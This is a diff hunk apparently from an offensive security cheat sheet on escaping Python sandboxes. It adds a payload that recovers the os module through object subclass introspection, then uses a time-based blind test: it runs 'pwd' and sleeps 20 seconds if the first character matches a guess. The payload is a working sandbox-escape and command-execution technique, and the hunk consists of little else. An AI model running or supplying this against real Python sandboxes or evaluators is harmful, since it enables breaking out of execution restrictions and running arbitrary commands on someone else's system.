@@ -94,6 +94,12 @@ for file_index in range(0,ndir):                             # This will be on a
 ## Restore builtins and execute time based python command \(characters limited to 300\)
 
 ```text
+# Commands lists
 
+# GUESS current working directory
+i=().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os')
+if i.popen('pwd').read()[0]=='a': i.system('sleep 20')
+
+# GUESS 
 ```
 
